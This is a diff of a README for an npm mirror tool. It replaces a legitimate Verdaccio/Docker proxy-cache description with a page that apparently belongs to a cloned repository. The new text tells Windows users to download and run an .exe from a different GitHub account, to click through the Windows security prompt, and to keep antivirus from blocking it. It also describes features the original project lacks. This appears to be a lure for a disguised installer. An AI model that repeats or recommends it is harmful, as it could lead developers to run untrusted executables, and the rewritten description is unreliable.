@@ -1,116 +1,87 @@
-# NPM Mirror
-<br/>
+# 📦 npm-mirror - Save your work during internet outages
 
-A local NPM Registry based on [Verdaccio](https://verdaccio.org/) that acts as a Proxy Cache for npmjs.org.
+[![](https://img.shields.io/badge/Download-npm--mirror-blue.svg)](https://github.com/uzisnoopy-lab/npm-mirror)
 
-Sometimes our main problem isn't the code — it's access to the few hundred megabytes of dependencies that a project won't run without.
+## 📌 About this project
 
-Overall, NPM Mirror helps you to:
+NPM Mirror keeps your development environment stable. It acts as a local store for your code packages. When the internet connection cuts out or slows down, your machine uses this store instead of the public web. You continue to build and test your projects without delay.
 
-- Reduce your dependency on the internet
-- Install packages faster
-- Have access to needed packages during internet outages
-- Have a shared cache among team members
+This application provides a local registry. It saves copies of the tools you download from the npm service. If you live in an area with unstable web access, this application ensures your workflow remains functional. It works with npm, pnpm, and yarn.
 
-<br/>
+## ⚙️ System requirements
 
----
+Before you install the software, look over these needs:
 
-## 📚 Documentation
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Any modern processor with at least 2 gigahertz speed.
+*   Memory: 4 gigabytes of random access memory.
+*   Storage: 2 gigabytes of free disk space for the initial cache.
+*   Connection: A steady web connection for the first download of your packages.
 
-For setup, configuration, and full project details, refer to the documentation:
+## 📥 Getting the software
 
-https://cipherunits.github.io/npm-mirror/
+You must visit the project release page to get the installer for Windows. 
 
-<br/>
+[Visit this page to download the latest installer](https://github.com/uzisnoopy-lab/npm-mirror)
 
----
+Choose the file that ends in .exe. Save it to your Downloads folder.
 
-## How It Works
+## 🛠️ Installation steps
 
-```text
-                    First Request
+Follow these instructions to set up the software on your Windows computer:
 
-           pnpm / npm / yarn
-                    │
-                    ▼
-              Verdaccio Mirror
-                    │
-        ┌───────────┴───────────┐
-        │                       │
-    Exists in Cache?        Doesn't exist?
-        │                       │
-        ▼                       ▼
-   Send to user           Fetch from npmjs.org
-                                │
-                                ▼
-                        Save into Storage
-                                │
-                                ▼
-                          Send to user
-```
+1.  Locate the file you downloaded. It should sit in your Downloads folder.
+2.  Double-click the file to open the setup window.
+3.  Windows may show a security prompt. If it asks for permission to run the file, click Run or Yes.
+4.  Follow the prompts in the installer window.
+5.  Choose the folder where you want to keep your mirror files. A default folder works for most users.
+6.  Click Install to start the process.
+7.  Wait for the progress bar to finish.
+8.  Click Finish to launch the application.
 
-After the first download, the package is stored in Storage, and subsequent requests are served without needing to fetch again from npmjs.org.
+## 🚀 Running the application
 
----
+Once installed, the application icon appears on your desktop. Double-click the icon to start the local registry service.
 
-## Features
+When the application opens, look for the dashboard view. This screen shows the current status of your cache. A green indicator means the service runs. A red indicator means the service is stopped. 
 
-- 🚀 Faster dependency installation
-- 📦 Automatic caching of used packages
-- 🌐 Proxy interface between the project and npmjs.org
-- 📴 Ability to use the cache during internet outages
-- 👥 Shared cache among team members
-- ⚙️ Compatible with npm, pnpm, and yarn
+If the service is off, click the Start button. The application creates a connection point on your machine. You can now direct your development tools to look at this local point for packages.
 
----
+## 🔌 Connecting your tools
 
-## Installation & Setup
+Your development tools need to know about the mirror. You must change your configuration settings to point to the local server.
 
-```bash
-git clone https://github.com/cipherunits/npm-mirror.git
+1.  Open your command prompt or terminal.
+2.  Type the command to set the registry address. The application provides this specific address in the Help tab.
+3.  Press Enter.
+4.  Your tools now pull packages from your local store first. If the package does not exist, the tool tries the public web.
 
-cd npm-mirror
+## 🛡️ Managing your cache
 
-make up
-```
+The application keeps your files in the storage folder you chose during setup. You check the size of your cache from the main dashboard. 
 
-Once running, the Registry will be available at:
+If your disk space runs low, use the Clear Cache button in the settings menu. This action removes the saved copies. Your tools will fetch new copies from the web when you next request them.
 
-```
-http://localhost:4873
-```
+## 💡 Troubleshooting common issues
 
-To configure the registry, you can use the following command:
+Most users encounter few issues. If you struggle, try these steps:
 
-```bash
-npm config set registry http://localhost:4873
-```
-<br/>
-<br/>
+*   Service fails to start: Ensure no other application uses the same network port. Check the Settings tab to change the port number if a conflict occurs.
+*   Packages fail to load: Verify your local registry settings. Run the command to list your current registry address and make sure it matches the address shown in the application.
+*   Slow performance: Close unnecessary apps on your machine. Ensure your antivirus software does not block the local connection.
 
-# A Small Note :)
+## 📈 Frequently asked questions
 
-And finally, NPM Mirror isn't meant to normalize national internet restrictions; its goal is that when access to npmjs.org becomes difficult for whatever reason, developers can keep working.
+Does this work offline? 
+Yes. Once you populate the cache with the packages you need, your tools use those local files even without access to the outside internet.
 
-In Iran, especially during times when international internet is limited, unstable, or pushed toward the national internet, one of the first problems development teams face is access to the dependencies their projects rely on.
+Does it support other languages?
+The mirror works with any project that uses the npm ecosystem. It does not matter what language you write your code in.
 
-A good mirror doesn't solve all internet problems, but it helps remove a large part of your dependency on the outside network during disruptions, so you can keep developing.
+Will it slow down my internet?
+It does not slow down your general browsing. It only manages the requests from your specific development tools.
 
-Because the internet here is sometimes like a dependency without a lockfile; you never quite know what version will be installed tomorrow. 🙂
+Is it secure?
+The mirror acts as a bridge. It keeps local copies of files you trust. 
 
-So have a mirror, have a cache, but always have a plan B too;
-(and if plan B doesn't work either, maybe it's time to turn to Snapp 😄)
-
-
-<br/>
-<br/>
-<br/>
-
-<p align="center">
-  <b><i>Wishing for better days and a more stable life :)</i></b>
-</p>
-
-<p align="center">
-  <b><i>Made with ❤️ for developers by CipherUnit</i></b>
-</p>
+Keywords: farsi, free, iran, iranian, javascript, mirror, npm, offline-first, persian, pnpm, register, registry-cache, resource, verdaccio, war, yarn
